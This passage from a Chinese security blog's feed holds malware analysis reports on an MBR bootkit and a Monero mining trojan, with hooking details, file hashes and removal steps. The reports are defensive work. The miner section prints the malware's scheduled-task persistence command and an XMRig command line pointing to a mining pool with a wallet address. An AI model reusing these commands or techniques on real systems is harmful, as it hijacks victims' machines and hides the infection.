src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/07_MBR%E6%84%9F%E6%9F%93%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20191028171033742.png" alt="image-20191028171033742"></p><h3 id="恢复原始MBR"><a href="#恢复原始MBR" class="headerlink" title="恢复原始MBR"></a>恢复原始MBR</h3><p>在地址<code>9F04D</code>中，通过调用被Hook的<code>int 13</code>中断，将==0扇道62扇区(7C00)==中的<code>原始MBR</code>的数据写入到内存地址<code>7C00</code>处。写入完成后，再通过跳转到内存地址<code>7C00</code>中，去执行原始的MBR，从而实现恢复执行原本的正常开机操作，指令如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/07_MBR%E6%84%9F%E6%9F%93%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20191028172543515.png" alt="image-20191028172543515"></p><p>将原始MBR拷贝到0x7C00，0x7C00处的指令前后对比如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/07_MBR%E6%84%9F%E6%9F%93%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20191028190441620.png" alt="image-20191028190441620"></p><h2 id="分析被Hook的int-13中断"><a href="#分析被Hook的int-13中断" class="headerlink" title="分析被Hook的int 13中断"></a>分析被Hook的int 13中断</h2><p>由于上一步恢复原始MBR时，会调用被Hook的<code>int 13</code>中断来实现。当调用被Hook的<code>int 13</code>中断时，会使其跳转到申请的内存地址<code>9FC66</code>中去执行。接下来将主要分析要执行的Hook函数。</p><p><strong>Hook int 13的hook函数进行的操作有：</strong></p><ul><li>根据判断调用int 13中断的不同方式，恢复原本int 13要执行的操作。</li><li>遍历匹配<code>ntldr</code>寻找特征序列码：==8B F0 85 F6 74 21 80 3D==</li><li>Hook 找到的特征码指令，将其指令修改为<code>call 9F1FC</code>，但实际call的地址是<code>9F200</code>，也就是执行之前拷贝到内存空间的==第60扇区中的数据==，这样就又回到了病毒代码。</li></ul><h3 id="恢复原本int-13要执行的操作"><a href="#恢复原本int-13要执行的操作" class="headerlink" title="恢复原本int 13要执行的操作"></a>恢复原本int 13要执行的操作</h3><p>在之前Hook int 13中断时，将原本int 13要跳转的地址存在了CS:0x73的偏移处（可看之前hook int 13有分析），</p><p>然后首先通过对比ah的值来判断调用int 13的方式，分为扩展int 13调用读方式和非扩展int 13调用读方式，当不是这两种时，便会跳转到原本int 13应该跳转的地址<code>ECBE2</code>，执行原本的int 13应该执行的操作；若是这两种调用方式，便跳转到<code>9F077</code>去执行，然而在9F07E处，又重新call 了原本int 13的地址，代码如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/07_MBR%E6%84%9F%E6%9F%93%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20191028181744048.png" alt="image-20191028181744048"></p><h3 id="遍历匹配特征序列码"><a href="#遍历匹配特征序列码" class="headerlink" title="遍历匹配特征序列码"></a>遍历匹配特征序列码</h3><p>通过汇编指令<code>repne scasb</code>来遍历<code>ntldr</code>匹配特征序列：8B F0 85 F6 74 21 80 3D，来寻找要Hook的地方，指令如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/07_MBR%E6%84%9F%E6%9F%93%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20191028192647478.png" alt="image-20191028192647478"></p><p>匹配到的特征序列（要被Hook的指令）对应的反汇编，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/07_MBR%E6%84%9F%E6%9F%93%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20191028194904794.png" alt="image-20191028194904794"></p><h3 id="Hook-匹配到的特征码的指令"><a href="#Hook-匹配到的特征码的指令" class="headerlink" title="Hook 匹配到的特征码的指令"></a>Hook 匹配到的特征码的指令</h3><p>Hook 找到的特征码指令，将其指令<code>mov si,ax</code>修改为<code>call 9F1FC</code>，当执行这条指令时，便会跳转到地址<code>9F200</code>中去执行，也就是执行之前拷贝到内存空间的==第60扇区中的数据==，这样就又回到了病毒的代码区域。</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/07_MBR%E6%84%9F%E6%9F%93%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20191028194835292.png" alt="image-20191028194835292"></p><p>Hook前后的指令，对比如下图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/07_MBR%E6%84%9F%E6%9F%93%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20191028195313983.png" alt="image-20191028195313983"></p><h2 id="分析被Hook的ntldr"><a href="#分析被Hook的ntldr" class="headerlink" title="分析被Hook的ntldr"></a>分析被Hook的ntldr</h2><p>通过上一步通过匹配特征Hook了ntldr中的地址<code>46C3C</code>中的指令，当执行到地址<code>46C3C</code>时，便会执行指令<code>call off_9F1FC（实际call到内存地址0x9F200上去执行）</code>，重新回到之前拷贝到申请的内存中的60扇区中的指令去执行，接下来将详细分析拷贝到申请内存中的60扇区中的指令。</p><p><strong>写入60扇区中的指令主要操作有：</strong></p><ul><li>通过遍历匹配特征，定位到 <code>BlLoaderBlock</code> 结构，再根据层层结果遍历得到<code>ntoskrnl.exe</code>的模块基址。</li><li>遍历模块<code>ntoskrnl.exe</code>，匹配特征6A 4B 6A 19 E8 和 E8 xx xx xx xx xx 84 C0，找到要Hook的地址，也就是找到函数<code>IoInitSystem</code>。</li><li>将61扇区中大小为512字节的指令，拷贝至该<code>ntoskrnl.exe</code>模块的最后512字节的位置中，并记下拷贝后的起始地址。</li><li>Hook之前匹配的执行函数<code>IoInitSystem</code>处的地址，将其指令修改为跳转到拷贝后的起始位置去执行。</li></ul><h3 id="获取ntoskrnl-exe模块基址"><a href="#获取ntoskrnl-exe模块基址" class="headerlink" title="获取ntoskrnl.exe模块基址"></a>获取ntoskrnl.exe模块基址</h3><p>通过遍历匹配特征 ==C7 46 34 00 40==，定位到 <code>BlLoaderBlock</code> 结构，再根据BlLoaderBlock-&gt;LoadOrderListHead-&gt;nt!_LDR_DATA_TABLE_ENTRY-&gt;ntoskrnl.exe，遍历得到<code>ntoskrnl.exe</code>的模块基址，指令如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/07_MBR%E6%84%9F%E6%9F%93%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20191028202135933.png" alt="image-20191028202135933"></p><h3 id="匹配特征找到要Hook的地址"><a href="#匹配特征找到要Hook的地址" class="headerlink" title="匹配特征找到要Hook的地址"></a>匹配特征找到要Hook的地址</h3><p> 遍历获取到的<code>ntoskrnl.exe</code>的模块，先根据特征值==6A 4B 6A 19 E8==再根据==E8 xx xx xx xx xx 84 C0==匹配到要Hook的地址<code>0x8069A3CF</code>（执行函数<code>IoInitSystem</code>的地址），并将执行函数<code>IoInitSystem</code>的地址保存至0x9F400（61扇区）+0x4的偏移处，用来恢复被Hook的<code>IoInitSystem</code>指令，然后将要Hook的地址压进栈中保存。指令如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/07_MBR%E6%84%9F%E6%9F%93%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20191030195826804.png" alt="image-20191030195826804"></p><p>匹配到特征的地址处的指令（Hook前的原始指令），如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/07_MBR%E6%84%9F%E6%9F%93%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20191030195236994.png" alt="image-20191030195236994"></p><h3 id="拷贝61扇区中的数据至文件末尾"><a href="#拷贝61扇区中的数据至文件末尾" class="headerlink" title="拷贝61扇区中的数据至文件末尾"></a>拷贝61扇区中的数据至文件末尾</h3><p>遍历文件<code>ntoskrnl.exe</code>，找到该文件末尾512字节地址处，并将样本写入61扇区中的数据拷贝到该位置处，并记录下拷贝后的起始地址。</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/07_MBR%E6%84%9F%E6%9F%93%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20191030195645876.png" alt="image-20191030195645876"></p><p>文件末尾512字节(0x806E5E00)拷贝前后对比图:</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/07_MBR%E6%84%9F%E6%9F%93%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20191031192527569.png" alt="image-20191031192527569"></p><h3 id="Hook-匹配到特征的地址"><a href="#Hook-匹配到特征的地址" class="headerlink" title="Hook 匹配到特征的地址"></a>Hook 匹配到特征的地址</h3><p>首先将之前通过匹配特征码找到的函数<code>IoInitSystem</code>执行的地址，从栈中取出来，然后将执行函数<code>IoInitSystem</code>的指令修改为执行拷贝61扇区到最后512字节的地址0x806E5E00处，此时hook后就会call到拷贝61扇区数据后的地址处去执行，就能执行回样本写入的指令处，实现Hook。</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/07_MBR%E6%84%9F%E6%9F%93%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20191031192929062.png" alt="image-20191031192929062">Hook前后的指令对比图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/07_MBR%E6%84%9F%E6%9F%93%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20191031193523206.png" alt="image-20191031193523206"></p><h2 id="分析被Hook的ntoskrnl"><a href="#分析被Hook的ntoskrnl" class="headerlink" title="分析被Hook的ntoskrnl"></a>分析被Hook的ntoskrnl</h2><p>当操作系统启动时，便会执行<code>ntoskrnl</code>中被Hook的函数，便会跳转到文件末尾的病毒代码空间中去执行。也就是病毒写入61扇区中的指令，其主要功能是实现加载并运行之前写入的驱动程序。</p><p>写入<code>ntoskrnl</code>中的病毒代码（61扇区）主要实现了：</p><ul><li>调用函数<code>ExAllocatePool</code>，开辟内存空间，然后将（61扇区中）剩下的未执行的指令拷贝至开辟的内存空间中，并跳转到内存空间中执行。</li><li>执行之前被Hook 的函数IoInitSystem，初始化操作系统。</li><li>将恶意样本之前写入的驱动文件加载至内存中，将其展开并运行该驱动程序。</li></ul><h3 id="开辟内存空间拷贝数据并执行"><a href="#开辟内存空间拷贝数据并执行" class="headerlink" title="开辟内存空间拷贝数据并执行"></a>开辟内存空间拷贝数据并执行</h3><p>首先根据hash值3707E062h，调用函数<code>SearchKernelFunctionAddress</code>，来获取函数<code>ExAllocatePool</code>的地址。然后再执行函数<code>ExAllocatePool</code>开辟大小为1ABh的内存空间，将（61扇区拷贝至ntoskrnl中的指令）剩下还未执行的指令拷贝到虚拟内存空间中执行。代码如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/07_MBR%E6%84%9F%E6%9F%93%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20191103160909136.png" alt="image-20191103160909136"></p><h3 id="执行之前被Hook的函数IoInitSystem"><a href="#执行之前被Hook的函数IoInitSystem" class="headerlink" title="执行之前被Hook的函数IoInitSystem"></a>执行之前被Hook的函数IoInitSystem</h3><p>通过将之前压进栈的函数IoInitSystem的地址取出，然后Call去调用之前被Hook的函数<code>IoInitSystem</code>，来初始化操作系统。指令如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/07_MBR%E6%84%9F%E6%9F%93%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20191103161919014.png" alt="image-20191103161919014"></p><p>###　加载恶意驱动文件并执行</p><p>首先获取一些内核函数，如ntOpenFile，ntReadFile，ntClose，ExAllocatepool。然后再将之前样本写入磁盘的驱动程序加载到内存中，将其展开并跳转到OEP处去运行，指令如下图：</p><p><strong>读取到样本写入的驱动文件：</strong></p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/07_MBR%E6%84%9F%E6%9F%93%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20191103174921598.png" alt="image-20191103174921598"></p><p><strong>将其再内存中展开：</strong></p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/07_MBR%E6%84%9F%E6%9F%93%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20191103175101629.png" alt="image-20191103175101629"></p><p><strong>跳转到驱动程序的OEP处执行：</strong></p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/07_MBR%E6%84%9F%E6%9F%93%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20191103175319220.png" alt="image-20191103175319220"></p><h2 id="恶意驱动程序有待进一步分析"><a href="#恶意驱动程序有待进一步分析" class="headerlink" title="恶意驱动程序有待进一步分析"></a>恶意驱动程序有待进一步分析</h2><p>由于驱动相关方面的知识还很匮乏，这里就先不继续进行分析了。以后有相关知识的累积再进一步进行分析。</p><h1 id="样本溯源"><a href="#样本溯源" class="headerlink" title="样本溯源"></a>样本溯源</h1><p>经过分析可知，该样本属于Bootkit类型病毒， Bootkit是更高级的Rootkit。经过查找相关指令应该是早些年爆发的==鬼影病毒==，利用感染MBR，加载恶意驱动程序来实施攻击。</p><p><strong>相关文件信息</strong></p><table><thead><tr><th>FileName</th><th>FileSize</th><th>MD5</th></tr></thead><tbody><tr><td>1.exe11.vir</td><td>236 KB (242,176 字节)</td><td>8CFA512BA62399F135C03505A93533F3</td></tr><tr><td>1.exe11.dll</td><td>236 KB (242,176 字节)</td><td>8CFA512BA62399F135C03505A93533F3</td></tr><tr><td>恶意驱动文件</td><td>239 KB (244,736 字节)</td><td>D00123F9C4C3226B8800A623C9999D70</td></tr><tr><td>00000218.tmp</td><td>根据系统环境不定</td><td>根据系统环境不定</td></tr></tbody></table><h1 id="查杀方案"><a href="#查杀方案" class="headerlink" title="查杀方案"></a>查杀方案</h1><h2 id="恢复原始MBR-1"><a href="#恢复原始MBR-1" class="headerlink" title="恢复原始MBR"></a>恢复原始MBR</h2><p>由于该样本修改了原始的MBR，执行修改后的MBR来实施攻击，只需要将原始的MBR还原就可以阻止该攻击了，具体操作为：</p><ul><li>删除修改后的MBR中的数据，将存储在62扇区中的原本的MBR数据还原回MBR中，就可以达到恢复的效果了。</li></ul><h2 id="删除注册的服务"><a href="#删除注册的服务" class="headerlink" title="删除注册的服务"></a>删除注册的服务</h2><p>由于该样本将自身修改为一个dll文件，并注册为了系统服务。在恢复时还需要将该服务进行删除，执行如下指令即可：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">regsvr32 &#x2F;u  &quot;&lt;SamplePath&gt;.dll&quot;</span><br></pre></td></tr></table></figure><h2 id="删除恶意写入的数据"><a href="#删除恶意写入的数据" class="headerlink" title="删除恶意写入的数据"></a>删除恶意写入的数据</h2><p>恢复过MBR后，还需要将恶意样本写入到操作系统中的数据删除，具体操作为：</p><ul><li>删除60,61,62扇区中的数据</li><li>删除写入磁盘中的驱动文件</li><li>删除释放在样本当前目录下的dll文件</li><li>删除释放在临时目录下的00000218.tmp文件</li></ul><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><blockquote><p>该恶意样本通过感染MBR实现早于系统执行自己的恶意代码来将写入磁盘中的驱动文件加载起来运行。整个样本以非文件形式存在，直接写入磁盘扇区。并且是对MBR进行的感染，在很大程度上能隐蔽自身，并在一定程度上逃避杀软的检测。因此建议在平时使用计算机时，不要随意下载不正常文件，不接受不明来源的文件，以避免感染病毒。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 样本分析报告 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 奇兵计划 </tag>
            
            <tag> 样本分析报告 </tag>
            
            <tag> BootKit </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>挖矿木马分析报告</title>
      <link href="2019/10/20/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/06_%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/"/>
      <url>2019/10/20/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/06_%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/</url>
      
        <content type="html"><![CDATA[<center><font size = 8><b>挖矿木马分析报告</b></font></center><h1 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h1><table><thead><tr><th align="center">样本名称</th><th align="center">d48ab2e921f5c725672fce16135d1f09.vir</th></tr></thead><tbody><tr><td align="center"><strong>样本类型</strong></td><td align="center"><strong>挖矿木马</strong></td></tr><tr><td align="center"><strong>样本大小</strong></td><td align="center"><strong>457 KB (468,480 字节)</strong></td></tr><tr><td align="center"><strong>MD5</strong></td><td align="center"><strong>d48ab2e921f5c725672fce16135d1f09</strong></td></tr></tbody></table><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><blockquote><p>该挖矿木马感染受害主机后，会将自身复制到<code>%AppData%目录</code>下，并以svchostx64.exe来命名，从而伪装自身。然后通过创建计划任务来维持该样本运行。样本文件的<code>.plato节表</code>中包含了一个开源的矿机<code>XMRig.exe</code>，该恶意样本再执行时通过创建自身傀儡进程，将开源矿机<code>XMRig.exe</code>注入其中，从而实现利用受害主机资源来进行挖矿。该样本不仅会判断受害主机当前是否处于空闲，还会监控进程。当不空闲时（也就是用户正在执行操作时）或是监控到任务管理器进程时，便结束傀儡进程，终止挖矿，来隐藏自身不被发现。</p></blockquote><h1 id="流程图"><a href="#流程图" class="headerlink" title="流程图"></a>流程图</h1><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/06_%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/07_%E6%8C%96%E7%9F%BF%E6%9C%A8%E9%A9%AC.png" alt="07_挖矿木马"></p><h1 id="简单行为分析"><a href="#简单行为分析" class="headerlink" title="简单行为分析"></a>简单行为分析</h1><h2 id="复制自身"><a href="#复制自身" class="headerlink" title="复制自身"></a>复制自身</h2><p>运行样本后，复制自身文件到指定目录<code>C:\Users\&lt;UserName&gt;\AppData\Roaming\</code>下，并重命名为<code>svchostx64.exe</code>。如图1：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/06_%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1570759489414.png" alt="1570759489414"></p><center>图1</center><h2 id="创建计划任务"><a href="#创建计划任务" class="headerlink" title="创建计划任务"></a>创建计划任务</h2><p>该样本通过调用<code>schtasks.exe</code>,执行如下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;C:\Windows\System32\schtasks.exe&quot; &#x2F;SC MINUTE &#x2F;MO 1 &#x2F;F &#x2F;Create &#x2F;TN Adasdsadas3id &#x2F;tr &quot;\&quot;C:\Users\john\AppData\Roaming\svchostx64.exe\&quot;&quot;</span><br></pre></td></tr></table></figure><p>创建名为==Adasdsadas3id==的计划任务，每一分钟运行一次释放出来的<code>svchostx64.exe</code>，如图2：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/06_%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1570759700585.png" alt="1570759700585"></p><center>图2</center><p>每一分钟运行一次计划任务，并迅速结束了自身程序，如图3：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/06_%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1570760693484.png" alt="1570760693484"></p><center>图3</center><h2 id="进行网络连接"><a href="#进行网络连接" class="headerlink" title="进行网络连接"></a>进行网络连接</h2><p>可以从上图中看出，再创建完计划任务后，再次==运行自身程序==，并执行了如下参数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-o monerohash.com:3333 -u 4BrL51JCc9NGQ71kWhnYoDRffsDZy7m1HUU7MRU4nUMXAHNFBEJhkTZV9HdaL4gfuNBxLPc3BeMkLGaPbF5vWtANQni58KYZqH43YSDeqY -p x -k --donate-level&#x3D;1 -t 3</span><br></pre></td></tr></table></figure><p>其中含有可疑URL：<code> monerohash.com:3333</code>，如图4：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/06_%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1570760329353.png" alt="1570760329353"></p><center>图4</center><p>并与IP：<code>107.191.99.95：3333</code>和<code>107.191.99.221:3333</code>，进行TCP链接，如图5：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/06_%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1570760539014.png" alt="1570760539014"></p><center>图5</center><h1 id="样本详细分析"><a href="#样本详细分析" class="headerlink" title="样本详细分析"></a>样本详细分析</h1><h2 id="获取dump-exe"><a href="#获取dump-exe" class="headerlink" title="获取dump.exe"></a>获取dump.exe</h2><p>首先通过工具查壳，显示该恶意样本没有壳，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/06_%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1570865891662.png" alt="1570865891662"></p><p><strong>异常区段</strong></p><p>然后查看样本的节表，发现其中<code>.data</code>区段很可疑。其中<code>.data</code>区段的<code>virtualsize</code>远远大于<code>Raw Size</code>，基本可以推测该样本是一个经过特殊处理的，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/06_%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1570873032573.png" alt="1570873032573"></p><p><strong>混淆代码</strong></p><p>然后将样本拖入IDA中，发现其中有大量窗体程序的<code>API</code>，而样本的执行行为中并没有发现有关窗体的行为。</p><p>经过分析，这些窗体程序的<code>API</code>全部都==存在问题==，都无法正常执行，（推断这些<code>API</code>是用来==迷惑分析==的）。但在这些==迷惑分析==的<code>API</code>中，夹杂着真正执行的程序代码。如下图，红色框标识的便是真正执行的程序代码。除红色框标识外的指令，大多都是垃圾指令，都无法正常执行。</p><p>==真正执行的程序代码：==</p><ul><li>调用函数<code>LocalAlloc</code>，开辟大小为<code>0X4FCF3</code>的堆空间</li><li>将地址<code>0x40D1C+0x7958C</code>中的==经过加密==的汇编指令，写入开辟的堆空间中</li><li>执行函数<code>Decode_409320</code>，==解密==堆空间中的汇编指令</li><li>执行开辟的堆空间中的汇编指令</li></ul><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/06_%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1570871646828.png" alt="1570871646828"></p><p><strong>获取dump.exe</strong></p><p>由于在执行堆空间中的指令之前都没有执行任何功能代码，便==推测==在堆空间中，很可能会开辟虚拟空间来存储==PE文件==，然后将其展开再执行。</p><p>这里用<code>OD</code>跟到开辟的堆空间中，给函数<code>VirtualAlloc</code>下断点，然后F9运行，发现果不其然命中断点，然后再在开辟的虚拟空间中下==硬件写入断点==，果真写入了一个PE文件，==应征了推测==。这里便可将其dump下来，并起名为<code>dump.exe</code>，该文件便是真正要执行的程序。如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/06_%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1570873528537.png" alt="1570873528537"></p><p>然后继续用<code>OD</code>跟，便会发现在虚拟空间中，将这个==PE文件进行展开==，然后最终跳回该PE文件的<code>OEP</code>处执行。</p><h2 id="分析dump-exe"><a href="#分析dump-exe" class="headerlink" title="分析dump.exe"></a>分析dump.exe</h2><p>上一步将样本进行了脱壳，获取到<code>dump.exe</code>，该文件便是该恶意样本的主要行为程序。</p><p><strong>其主要执行了：</strong></p><ul><li>创建互斥体</li><li>复制自身到<code>%AppData%\svchostx64.exe</code></li><li>创建计划任务，每分钟执行一次<code>svhostx64.exe</code></li><li>创建线程，防止系统进入休眠状态</li><li>获取区段<code>.plator</code>中的开源矿机程序<code>XMRig.exe</code></li><li>创建==傀儡进程==，将矿机程序<code>XMRig.exe</code>注入创建的傀儡进程，并监视进程，当检测到进程==任务管理器时==，便终止==傀儡进程==</li></ul><p><strong>主要行为函数代码段如图：</strong></p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/06_%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1570875067157.png" alt="1570875067157"></p><h3 id="隐式加载调用函数"><a href="#隐式加载调用函数" class="headerlink" 